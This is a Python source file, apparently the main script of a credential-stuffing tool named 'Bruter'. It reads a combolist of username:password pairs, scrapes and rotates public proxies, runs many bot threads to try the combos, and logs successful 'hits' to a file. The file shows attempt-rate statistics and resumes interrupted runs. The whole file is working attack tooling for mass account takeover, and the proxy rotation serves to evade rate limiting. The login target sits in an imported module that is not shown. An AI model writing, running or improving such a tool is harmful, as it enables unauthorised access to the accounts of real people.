from module.bruter import Bruter
from module.const import (combos_max, proxies_minimum)
from module.proxy_manager import ProxyManager
from module.proxy_scraper import ProxyScraper

import argparse
import hashlib
from asciimatics.screen import Screen
from collections import deque
from sys import (path, platform)
from threading import Thread
from time import (sleep, time)


def create_combo_queue(input_combo_file, combos_start):
    queue = deque()
    combo_count = 0

    with open(input_combo_file, 'r', encoding='utf-8', errors='ignore') as combo_file:
        for line in combo_file:
            if ':' in line:
                combo_count += 1
                
                if combo_count < combos_start:
                    continue
                
                if (combo_count - combos_start) > combos_max:
                    return queue
                
                combo = line.replace('\n', '').replace('\r', '').replace('\t', '')
                combo_parts = combo.split(':')
                queue.append([combo_parts[0], combo_parts[1]])

    return queue


def get_md5_hash(file_name):
    hash_md5 = hashlib.md5()
    
    with open(file_name, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            hash_md5.update(chunk)
            
    return hash_md5.hexdigest()


def sessions_get(path_sessions_file):
    sessions = {}
    
    try:
        with open(path_sessions_file, 'r', encoding='utf-8', errors='ignore') as sessions_file:
            for line in sessions_file:
                if ':' in line:
                    session = line.replace('\n', '').replace('\r', '').replace('\t', '')
                    session_parts = session.split(':')
                    sessions[session_parts[0]] = int(session_parts[1])
                    
    except:
        pass

    return sessions               


def sessions_add(path_sessions_file, file_hash, combos_position):
    sessions = sessions_get(path_sessions_file)
    sessions[file_hash] = combos_position
    sessions_file = open(path_sessions_file, 'w+', encoding='utf-8', errors='ignore')
    
    for key in sessions:
        sessions_file.write(key + ':' + str(sessions[key]) + '\n')

    sessions_file.close()


def screen_clear(screen, lines):
    for i in range(lines):
        screen.print_at(' ' * 80, 0, i+1)


def main(screen):
    parser = argparse.ArgumentParser()
    parser.add_argument('combo_file', help='The path to your combolist', type=str)
    parser.add_argument('bots', help='How many bots you want to use', type=int)
    args = parser.parse_args()
    
    if 'linux' in platform or 'darwin' in platform:
        path_separator = '/'
            
    elif 'win' in platform:
        path_separator = '\\'
        
    else:
        path_separator = '/'

    path_sessions_file = path[0] + path_separator + 'sessions'
    path_output_file = path[0] + path_separator + 'output.txt'
    path_hits_file = path[0] + path_separator + 'hits.txt'

    combo_file_hash = get_md5_hash(args.combo_file)
    sessions = sessions_get(path_sessions_file)

    if combo_file_hash in sessions:
        combos_start = sessions[combo_file_hash]

    else:
        combos_start = 0
    
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Creating Combo Queue', 2, 1)
    screen.refresh()
    combo_queue = create_combo_queue(args.combo_file, combos_start)
    
    screen_clear(screen, 1)
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Getting Proxies', 2, 1)
    screen.refresh()
    proxy_scraper = ProxyScraper()
    proxy_scraper.scrape()

    proxy_manager = ProxyManager()
    proxy_manager.put(proxy_scraper.get())
    proxy_manager_thread = Thread(target=proxy_manager.start)
    proxy_manager_thread.daemon = True
    proxy_manager_thread.start()

    screen_clear(screen, 1)
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Starting Bots', 2, 1)
    screen.refresh()
    engine = Bruter(args.bots, combo_queue, proxy_manager, path_hits_file)
    engine.start()

    tested_per_min = 0
    attempts_per_min = 0
    tested_before_last_min = 0
    attempts_before_last_min = 0
    tested_per_min_list = deque(maxlen=5)
    attempts_per_min_list = deque(maxlen=5)

    time_start = time()
    time_checked = time_start
    time_output = time_start

    try:
        while len(combo_queue):
            time_now = time()
            time_running = time_now - time_start
            hours, rem = divmod(time_running, 3600)
            minutes, seconds = divmod(rem, 60)
            time_running_format = '{:0>2}:{:0>2}:{:05.2f}'.format(int(hours), int(minutes), seconds)

            screen_clear(screen, 16)
            screen.print_at('Bruter Status:' + ' ' * 9 + 'Running', 2, 1)
            screen.print_at('Time:' + ' ' * 18 + time_running_format, 2, 3)
            screen.print_at('Bots:' + ' ' * 18 + str(len(engine.bots)), 2, 4)
            screen.print_at('Hits:' + ' ' * 18 + str(engine.hits), 2, 5)
            screen.print_at('Combolist:' + ' ' * 13 + args.combo_file, 2, 7)
            screen.print_at('Combolist Position:' + ' ' * 4 + str(engine.tested + combos_start), 2, 8)
            screen.print_at('Loaded Combos:' + ' ' * 9 + str(len(combo_queue)), 2, 9)
            screen.print_at('Loaded Proxies:' + ' ' * 8 + str(proxy_manager.size), 2, 10)
            screen.print_at('Last Combo:' + ' ' * 12 + engine.last_combo[0] + ':' + engine.last_combo[1], 2, 11)
            screen.print_at('Tested:' + ' ' * 16 + str(engine.tested), 2, 13)
            screen.print_at('Attempts:' + ' ' * 14 + str(engine.tested + engine.retries), 2, 14)
            screen.print_at('Tested/min:' + ' ' * 12 + str(tested_per_min), 2, 15)
            screen.print_at('Attempts/min:' + ' ' * 10 + str(attempts_per_min), 2, 16)
            screen.refresh()

            if (time_now - time_checked) >= 60:
                time_checked = time_now
                tested_last_min = engine.tested - tested_before_last_min
                attempts_last_min = (engine.tested + engine.retries) - attempts_before_last_min
                tested_per_min_list.append(tested_last_min)
                attempts_per_min_list.append(attempts_last_min)
                tested_per_min = round(sum(tested_per_min_list) / len(tested_per_min_list), 2)
                attempts_per_min = round(sum(attempts_per_min_list) / len(attempts_per_min_list), 2)
                tested_before_last_min = engine.tested
                attempts_before_last_min = (engine.tested + engine.retries)

            if proxy_manager.size <= proxies_minimum:
                screen_clear(screen, 1)
                screen.print_at('Bruter Status:' + ' ' * 9 + 'Getting Proxies', 2, 1)
                screen.refresh()
                proxy_scraper.scrape()
                proxy_manager.put(proxy_scraper.get())

            sleep(0.25)

    except KeyboardInterrupt:
        pass

    combos_position = (combos_start + engine.tested)
    sessions_add(path_sessions_file, combo_file_hash, combos_position)

    screen_clear(screen, 1)
    screen.print_at('Bruter Status:' + ' ' * 9 + 'Stopping', 2, 1)
    screen.refresh()
    engine.stop()
    proxy_manager.stop()
    proxy_manager_thread.join()
    
    exit()


if __name__ == '__main__':
    Screen.wrapper(main)
